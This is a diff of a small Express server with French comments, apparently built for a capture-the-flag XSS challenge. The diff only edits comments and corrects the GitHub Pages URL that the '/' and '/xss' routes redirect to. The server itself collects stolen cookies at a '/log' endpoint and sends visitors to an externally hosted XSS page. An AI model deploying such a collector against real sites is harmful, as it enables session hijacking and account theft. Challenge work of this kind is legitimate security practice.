@@ -7,17 +7,17 @@ app.get('/log', (req, res) => {
   res.send('Cookie reçu, merci !');
 });
 
-// Redirection vers ta page XSS hébergée sur GitHub Pages
+
 app.get('/', (req, res) => {
-  res.redirect('https://aketo.github.io/xss-front/xss.html'); // ← adapte à ton vrai repo si différent
+  res.redirect('https://aket0.github.io/xss-front/xss.html'); // ← adapte à ton vrai repo si différent
 });
 
-// Route alternative au cas où tu veux soumettre cette URL au challenge
+
 app.get('/xss', (req, res) => {
-  res.redirect('https://aketo.github.io/xss-front/xss.html'); // ← idem
+  res.redirect('https://aket0.github.io/xss-front/xss.html'); 
 });
 
-// Lancement du serveur
+
 app.listen(5000, '0.0.0.0', () => {
   console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
 });
